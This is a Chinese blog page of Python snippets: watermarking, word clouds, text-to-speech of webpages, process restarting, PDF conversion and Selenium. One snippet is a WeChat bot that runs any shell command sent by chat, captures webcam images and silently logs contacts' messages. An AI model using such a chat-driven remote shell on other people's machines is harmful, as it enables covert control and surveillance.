<h3 id="图片水印"><a href="#图片水印" class="headerlink" title="图片水印"></a>图片水印</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image,ImageDraw,ImageFont</span><br><span class="line">image = Image.open(<span class="string">'wechat.png'</span>)</span><br><span class="line"># 打开等待加水印的图片</span><br><span class="line">watermark = Image.open(<span class="string">'mp.png'</span>)</span><br><span class="line"># 打开水印图片</span><br><span class="line">factor = <span class="number">1</span></span><br><span class="line"># 如果觉得水印图片太大，可以缩放，这里缩放比例为50%</span><br><span class="line">watermark = watermark.resize(</span><br><span class="line">    tuple(map(lambda x: int(x * factor), watermark.size)))</span><br><span class="line"># 缩放图片</span><br><span class="line">layer=Image.new(<span class="string">'RGBA'</span>,image.size)</span><br><span class="line"># 生成一个新的layer</span><br><span class="line">layer.paste(watermark,(image.size[<span class="number">0</span>]-watermark.size[<span class="number">0</span>],</span><br><span class="line">    image.size[<span class="number">1</span>]-watermark.size[<span class="number">1</span>]))</span><br><span class="line"># 把水印打到新的layer上去，后面参数是水印位置，此处是右下角    </span><br><span class="line">marked_img=Image.composite(layer,image,layer)</span><br><span class="line"># 添加水印</span><br><span class="line"># marked_img.show()# 打开生成的图片（缓存图片）</span><br><span class="line">marked_img.save(<span class="string">'wechat_remark.jpg'</span>)</span><br><span class="line"># 保存图片</span><br><span class="line"></span><br><span class="line">#文字水印https://www.qingwei.tech/programe-develops/python/1154.html</span><br><span class="line">image = Image.open(<span class="string">'lifeistoshort.jpg'</span>)</span><br><span class="line"># 打开要加水印的图片</span><br><span class="line">text=input(<span class="string">'输入你的水印文字:\n'</span>)</span><br><span class="line"># 提示要打水印的文字</span><br><span class="line">font=ImageFont.truetype(<span class="string">'C:\Windows\Fonts\simhei.ttf'</span>,<span class="number">64</span>)</span><br><span class="line"># 获得一个字体，你也可以自己下载相应字体，第二个值是字体大小</span><br><span class="line">layer=image.convert(<span class="string">'RGBA'</span>)</span><br><span class="line"># 将图片转换为RGBA图片</span><br><span class="line">text_overlay=Image.new(<span class="string">'RGBA'</span>,layer.size)</span><br><span class="line"># 依照目标图片大小生成一张新的图片 参数[模式,尺寸,颜色(默认为0)]</span><br><span class="line">image_draw=ImageDraw.Draw(text_overlay)</span><br><span class="line"># 画图</span><br><span class="line">text_size_x,text_size_y=image_draw.textsize(text,font=font)</span><br><span class="line"># 获得字体大小,textsize(text, font=None)</span><br><span class="line">text_xy=(layer.size[<span class="number">0</span>]-text_size_x,layer.size[<span class="number">1</span>]-text_size_y)</span><br><span class="line"># 设置文本位置 此处是右下角显示</span><br><span class="line">image_draw.text(text_xy, text, font=font, fill=(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">85</span>))</span><br><span class="line"># 设置文字，位置,字体,颜色和透明度</span><br><span class="line">marked_img=Image.alpha_composite(layer,text_overlay)</span><br><span class="line"># 将水印打到原图片上生成新的图片</span><br><span class="line">marked_img.save(<span class="string">'qingwei_after.png'</span>)</span><br><span class="line"># 保存图片</span><br><span class="line">marked_img.show()</span><br><span class="line"># 显示图片（这里是生成一个临时文件，必须关闭图片 这段py代码才算结束）</span><br></pre></td></tr></table></figure>
<h3 id="Python骚操作：微信远程控制电脑"><a href="#Python骚操作：微信远程控制电脑" class="headerlink" title="Python骚操作：微信远程控制电脑"></a>Python骚操作：微信远程控制电脑</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">pip install opencv-python</span><br><span class="line">pip install matplotlib</span><br><span class="line"><span class="meta">#!/usr/bin/env python</span></span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Time    : 2018/8/20 11:12</span><br><span class="line"># @Author  : yfzhou</span><br><span class="line"># @Site    : https://yfzhou.coding.me/2018/08/20/Python%E9%AA%9A%E6%93%8D%E4%BD%9C%EF%BC%9A%E5%BE%AE%E4%BF%A1%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E7%94%B5%E8%84%91/</span><br><span class="line"># @File    : wechat_control_computer.py</span><br><span class="line"># @Software: PyCharm</span><br><span class="line"># Life is short, I use python.</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> itchat</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line">sendMsg = u<span class="string">"&#123;消息助手&#125;：暂时无法回复"</span></span><br><span class="line">usageMsg = u<span class="string">"使用方法：\n1.运行CMD命令：cmd xxx (xxx为命令)\n"</span> \</span><br><span class="line">           u<span class="string">"-例如关机命令:\ncmd shutdown -s -t 0 \n"</span> \</span><br><span class="line">           u<span class="string">"2.获取当前电脑用户：cap\n3.启用消息助手(默认关闭)：ast\n"</span> \</span><br><span class="line">           u<span class="string">"4.关闭消息助手：astc"</span></span><br><span class="line">flag = 0  # 消息助手开关</span><br><span class="line">nowTime = time.localtime()</span><br><span class="line">filename = str(nowTime.tm_mday) + str(nowTime.tm_hour) + str(nowTime.tm_min) + str(nowTime.tm_sec) + <span class="string">".txt"</span></span><br><span class="line">myfile = open(filename, <span class="string">'w'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@itchat.msg_register(<span class="string">'Text'</span>)</span><br><span class="line">def text_reply(msg):</span><br><span class="line">    global flag</span><br><span class="line">    message = msg[<span class="string">'Text'</span>]</span><br><span class="line">    fromName = msg[<span class="string">'FromUserName'</span>]</span><br><span class="line">    toName = msg[<span class="string">'ToUserName'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> toName == <span class="string">"filehelper"</span>:</span><br><span class="line">        <span class="keyword">if</span> message == <span class="string">"cap"</span>:</span><br><span class="line">            cap = cv2.VideoCapture(<span class="number">0</span>)</span><br><span class="line">            ret, img = cap.read()</span><br><span class="line">            cv2.imwrite(<span class="string">"weixinTemp.jpg"</span>, img)</span><br><span class="line">            itchat.send(<span class="string">'@img@%s'</span> % u<span class="string">'weixinTemp.jpg'</span>, <span class="string">'filehelper'</span>)</span><br><span class="line">            cap.release()</span><br><span class="line">        <span class="keyword">if</span> message[<span class="number">0</span>:<span class="number">3</span>] == <span class="string">"cmd"</span>:</span><br><span class="line">            os.system(message.strip(message[<span class="number">0</span>:<span class="number">4</span>]))</span><br><span class="line">        <span class="keyword">if</span> message == <span class="string">"ast"</span>:</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            itchat.send(<span class="string">"消息助手已开启"</span>, <span class="string">"filehelper"</span>)</span><br><span class="line">        <span class="keyword">if</span> message == <span class="string">"astc"</span>:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            itchat.send(<span class="string">"消息助手已关闭"</span>, <span class="string">"filehelper"</span>)</span><br><span class="line">    elif flag == <span class="number">1</span>:</span><br><span class="line">        itchat.send(sendMsg, fromName)</span><br><span class="line">        myfile.write(message)</span><br><span class="line">        myfile.write(<span class="string">"\n"</span>)</span><br><span class="line">        myfile.flush()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    itchat.auto_login()</span><br><span class="line">    itchat.send(usageMsg, <span class="string">"filehelper"</span>)</span><br><span class="line">    itchat.run()</span><br></pre></td></tr></table></figure>
<h3 id="生成中文词云图"><a href="#生成中文词云图" class="headerlink" title="生成中文词云图"></a>生成中文词云图</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pip install wordcloud</span><br><span class="line">pip install jieba</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Time    : 2018/9/4 13:52</span><br><span class="line"># @Author  : yfzhou</span><br><span class="line"># @Site    : </span><br><span class="line"># @File    : demo10.py</span><br><span class="line"># @Software: PyCharm</span><br><span class="line"># Life is short, I use python.</span><br><span class="line"></span><br><span class="line"># 词云生成工具</span><br><span class="line"><span class="keyword">from</span> wordcloud <span class="keyword">import</span> WordCloud, ImageColorGenerator</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> path</span><br><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line"></span><br><span class="line"># 获取当前的项目文件加的路径</span><br><span class="line">d = path.dirname(__file__)</span><br><span class="line"># 读取一个txt文件https://yfzhou.coding.me/2018/09/04/Python-wordcloud-jieba-%E7%94%9F%E6%88%90%E4%B8%AD%E6%96%87%E8%AF%8D%E4%BA%91%E5%9B%BE/</span><br><span class="line">text = open(r<span class="string">'C:\Users\Administrator\Desktop\阿里传：这是阿里巴巴的世界美特里斯曼.txt'</span>, <span class="string">'r'</span>, encoding=<span class="string">'utf-8'</span>).read()</span><br><span class="line"># 读入背景图片</span><br><span class="line">bg_pic = plt.imread(r<span class="string">'C:\Users\Administrator\Pictures\Other\155061877268618276.jpg'</span>)</span><br><span class="line">wordlist_after_jieba = jieba.cut(text, cut_all=True)</span><br><span class="line">wl_space_split = <span class="string">" "</span>.join(wordlist_after_jieba)</span><br><span class="line"># 生成词云</span><br><span class="line">font = d + r<span class="string">'static/simkai.ttf'</span></span><br><span class="line">wc = WordCloud(</span><br><span class="line">    mask=bg_pic,</span><br><span class="line">    background_color=<span class="string">'white'</span>,</span><br><span class="line">    font_path=font,</span><br><span class="line">    scale=<span class="number">1.5</span>,</span><br><span class="line">    max_words=<span class="number">1500</span></span><br><span class="line">).generate(wl_space_split)</span><br><span class="line">image_colors = ImageColorGenerator(bg_pic)</span><br><span class="line"># 图片背景</span><br><span class="line">bg_color = ImageColorGenerator(bg_pic)</span><br><span class="line"># 开始画图</span><br><span class="line">plt.imshow(wc.recolor(color_func=bg_color))</span><br><span class="line">plt.axis(<span class="string">'off'</span>)</span><br><span class="line">plt.show()</span><br><span class="line"># 保存图片</span><br><span class="line">wc.to_file(d + r<span class="string">"/image/render_09.png"</span>)</span><br></pre></td></tr></table></figure>
<h3 id="朗读网页"><a href="#朗读网页" class="headerlink" title="朗读网页"></a>朗读网页</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pip install readability-lxml</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> readability <span class="keyword">import</span> Document</span><br><span class="line">pip install goose3</span><br><span class="line">response = requests.get(<span class="string">'https://hoxis.github.io/run-ansible-without-specifying-the-inventory-but-the-host-directly.html'</span>)</span><br><span class="line">doc = Document(response.text)</span><br><span class="line">print(doc.title())</span><br><span class="line">#https://yfzhou.coding.me/2018/09/05/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0%E7%94%A8-Python-%E6%9D%A5%E6%9C%97%E8%AF%BB%E7%BD%91%E9%A1%B5/</span><br><span class="line">&gt;&gt;&gt; <span class="keyword">from</span> goose3 <span class="keyword">import</span> Goose</span><br><span class="line">&gt;&gt;&gt; <span class="keyword">from</span> goose3.text <span class="keyword">import</span> StopWordsChinese</span><br><span class="line">&gt;&gt;&gt; url  = <span class="string">'http://news.china.com/socialgd/10000169/20180616/32537640_all.html'</span></span><br><span class="line">&gt;&gt;&gt; g = Goose(&#123;<span class="string">'stopwords_class'</span>: StopWordsChinese&#125;)</span><br><span class="line">&gt;&gt;&gt; article = g.extract(url=url)</span><br><span class="line">&gt;&gt;&gt; print(article.cleaned_text[:<span class="number">150</span>])</span><br><span class="line">北京时间<span class="number">6</span>月<span class="number">15</span>日<span class="number">23</span>:<span class="number">00</span>(圣彼得堡当地时间<span class="number">18</span>:<span class="number">00</span>)，<span class="number">2018</span>年世界杯B组一场比赛在圣彼得堡球场展开角逐，伊朗<span class="number">1</span>比<span class="number">0</span>险胜摩洛哥，伊朗前锋阿兹蒙半场结束前错过单刀机会，鲍哈杜兹第<span class="number">95</span>分钟自摆乌</span><br><span class="line">龙。这是伊朗<span class="number">20</span>年来首度在世界杯决赛圈取胜。</span><br><span class="line"></span><br><span class="line">本届世界杯，既相继出现替补便进球，贴补梅开二度以及东道主</span><br><span class="line"></span><br><span class="line">pip install playsound</span><br><span class="line">&gt; <span class="keyword">from</span> playsound <span class="keyword">import</span> playsound</span><br><span class="line">&gt;&gt;&gt; playsound(<span class="string">'/path/to/a/sound/file/you/want/to/play.mp3'</span>)</span><br><span class="line">#https://github.com/hoxis/to_voice/blob/master/page2voice.py</span><br></pre></td></tr></table></figure>
<h3 id="定时检测无响应进程并重启"><a href="#定时检测无响应进程并重启" class="headerlink" title="定时检测无响应进程并重启"></a>定时检测无响应进程并重启</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">#http://www.xetlab.com/2019/04/21/python%E7%BB%83%E6%89%8B%E8%84%9A%E6%9C%AC-%E5%AE%9A%E6%97%B6%E6%A3%80%E6%B5%8B%E6%97%A0%E5%93%8D%E5%BA%94%E8%BF%9B%E7%A8%8B%E5%B9%B6%E9%87%8D%E5%90%AF/</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> schedule</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def parse_output(output):</span><br><span class="line">    print(output)</span><br><span class="line">    pid_list = []</span><br><span class="line">    lines = output.strip().split(<span class="string">"\n"</span>)</span><br><span class="line">    <span class="keyword">if</span> len(lines) &gt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines[<span class="number">2</span>:]:</span><br><span class="line">            pid_list.append(line.split()[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> pid_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def list_not_response(process_name):</span><br><span class="line">    <span class="keyword">return</span> list_process(process_name, True)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def list_process(process_name, not_respond=False):</span><br><span class="line">    cmd = <span class="string">'tasklist /FI "IMAGENAME eq %s"'</span></span><br><span class="line">    <span class="keyword">if</span> not_respond:</span><br><span class="line">        cmd = cmd + <span class="string">' /FI "STATUS eq Not Responding"'</span></span><br><span class="line">    output = os.popen(cmd % process_name)</span><br><span class="line">    <span class="keyword">return</span> parse_output(output.read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_program(program):</span><br><span class="line">    os.popen(program)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check_job():</span><br><span class="line">    process_name = <span class="string">"xx.exe"</span></span><br><span class="line">    not_respond_list = list_not_response(process_name)</span><br><span class="line">    <span class="keyword">if</span> len(not_respond_list) &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    pid_params = <span class="string">" "</span>.join([<span class="string">"/PID "</span> + pid <span class="keyword">for</span> pid <span class="keyword">in</span> not_respond_list])</span><br><span class="line">    os.popen(<span class="string">"taskkill /F "</span> + pid_params)</span><br><span class="line">    <span class="keyword">if</span> len(list_process(process_name)) &lt;= <span class="number">0</span>:</span><br><span class="line">        start_program(r<span class="string">'E:\xxx\xx.exe'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    schedule.every(<span class="number">5</span>).seconds.do(check_job)</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        schedule.run_pending()</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h3 id="多线程PDF转Word"><a href="#多线程PDF转Word" class="headerlink" title="多线程PDF转Word"></a>多线程PDF转Word</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> configparser <span class="keyword">import</span> ConfigParser</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> open</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ProcessPoolExecutor</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFResourceManager</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> process_pdf</span><br><span class="line"><span class="keyword">from</span> pdfminer.converter <span class="keyword">import</span> TextConverter</span><br><span class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> LAParams</span><br><span class="line"><span class="keyword">from</span> docx <span class="keyword">import</span> Document</span><br><span class="line">#https://github.com/python-fan/pdf2word/blob/master/main.py</span><br><span class="line"></span><br><span class="line">def read_from_pdf(file_path):</span><br><span class="line">    <span class="keyword">with</span> open(file_path, <span class="string">'rb'</span>) <span class="keyword">as</span> file:</span><br><span class="line">        resource_manager = PDFResourceManager()</span><br><span class="line">        return_str = StringIO()</span><br><span class="line">        lap_params = LAParams()</span><br><span class="line"></span><br><span class="line">        device = TextConverter(</span><br><span class="line">            resource_manager, return_str, laparams=lap_params)</span><br><span class="line">        process_pdf(resource_manager, device, file)</span><br><span class="line">        device.close()</span><br><span class="line"></span><br><span class="line">        content = return_str.getvalue()</span><br><span class="line">        return_str.close()</span><br><span class="line">        <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def save_text_to_word(content, file_path):</span><br><span class="line">    doc = Document()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> content.split(<span class="string">'\n'</span>):</span><br><span class="line">        paragraph = doc.add_paragraph()</span><br><span class="line">        paragraph.add_run(remove_control_characters(line))</span><br><span class="line">    doc.save(file_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def remove_control_characters(content):</span><br><span class="line">    mpa = dict.fromkeys(range(<span class="number">32</span>))</span><br><span class="line">    <span class="keyword">return</span> content.translate(mpa)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pdf_to_word(pdf_file_path, word_file_path):</span><br><span class="line">    content = read_from_pdf(pdf_file_path)</span><br><span class="line">    save_text_to_word(content, word_file_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    config_parser = ConfigParser()</span><br><span class="line">    config_parser.read(<span class="string">'config.cfg'</span>)</span><br><span class="line">    config = config_parser[<span class="string">'default'</span>]</span><br><span class="line"></span><br><span class="line">    tasks = []</span><br><span class="line">    <span class="keyword">with</span> ProcessPoolExecutor(max_workers=int(config[<span class="string">'max_worker'</span>])) <span class="keyword">as</span> executor:</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(config[<span class="string">'pdf_folder'</span>]):</span><br><span class="line">            extension_name = os.path.splitext(file)[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> extension_name != <span class="string">'.pdf'</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            file_name = os.path.splitext(file)[<span class="number">0</span>]</span><br><span class="line">            pdf_file = config[<span class="string">'pdf_folder'</span>] + <span class="string">'/'</span> + file</span><br><span class="line">            word_file = config[<span class="string">'word_folder'</span>] + <span class="string">'/'</span> + file_name + <span class="string">'.docx'</span></span><br><span class="line">            print(<span class="string">'正在处理: '</span>, file)</span><br><span class="line">            result = executor.submit(pdf_to_word, pdf_file, word_file)</span><br><span class="line">            tasks.append(result)</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        exit_flag = True</span><br><span class="line">        <span class="keyword">for</span> task <span class="keyword">in</span> tasks:</span><br><span class="line">            <span class="keyword">if</span> not task.done():</span><br><span class="line">                exit_flag = False</span><br><span class="line">        <span class="keyword">if</span> exit_flag:</span><br><span class="line">            print(<span class="string">'完成'</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h3 id="自动化测试工具selenium"><a href="#自动化测试工具selenium" class="headerlink" title="自动化测试工具selenium"></a>自动化测试工具selenium</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#http://jeffyang.top/Python/%E7%88%AC%E8%99%AB/Python%E7%88%AC%E8%99%AB%E5%B8%B8%E7%94%A8%E5%BA%93selenium%E8%AF%A6%E8%A7%A3/</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.wait <span class="keyword">import</span> WebDriverWait</span><br><span class="line"></span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    browser.get(<span class="string">'https://www.baidu.com'</span>)</span><br><span class="line">    input = browser.find_element_by_id(<span class="string">'kw'</span>)</span><br><span class="line">    input.send_keys(<span class="string">'Python'</span>)</span><br><span class="line">    input.send_keys(Keys.ENTER)</span><br><span class="line">    wait = WebDriverWait(browser, <span class="number">10</span>)</span><br><span class="line">    wait.until(EC.presence_of_element_located((By.ID, <span class="string">'content_left'</span>)))</span><br><span class="line">    print(browser.current_url)</span><br><span class="line">    print(browser.get_cookies())</span><br><span class="line">    print(browser.page_source)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    browser.close()</span><br></pre></td></tr></table></figure>
